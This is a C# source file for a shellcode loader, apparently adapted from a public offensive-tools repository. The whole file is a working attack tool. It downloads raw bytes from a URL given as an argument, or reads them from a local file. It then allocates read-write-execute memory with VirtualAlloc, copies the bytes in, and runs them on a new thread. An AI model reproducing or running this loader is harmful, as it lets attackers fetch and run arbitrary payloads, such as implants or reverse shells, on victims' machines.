//Thanks @Arno0x: https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Threading;

namespace ShellcodeLoader
{
    class Program
    {
        static byte[] GetTextWeb(string url, int retry, int timeout)
        {
            Console.WriteLine($"{url}");

            // If https desired
            // ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient client = new WebClient();
            byte[] str = null;
            while (retry >= 0 && str == null)
            {
                try
                {
                    str = client.DownloadData(url);
                }
                catch (WebException ex)
                {
                    retry--;
                    Thread.Sleep(timeout * 10000);
                }
            }
            if (str == null)
            {
                Environment.Exit(-1);
            }

            return str;
        }
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Missing bin file");
                return;
            }
            var file = args[0];
            byte[]  x64shellcode;
            if (file.StartsWith("http"))
            {
                x64shellcode = GetTextWeb(file, 3, 1);
            } else
            {
                var fs = new FileStream(file, FileMode.Open);
                var len = (int)fs.Length;
                x64shellcode = new byte[len];
                fs.Read(x64shellcode, 0, len);
            }

            if (x64shellcode.Length == 0)
            {
                Console.WriteLine("Couldn't get shell bytes");
                return;
            }
            
            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)x64shellcode.Length,
                              (uint)StateEnum.MEM_COMMIT,
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
    }
}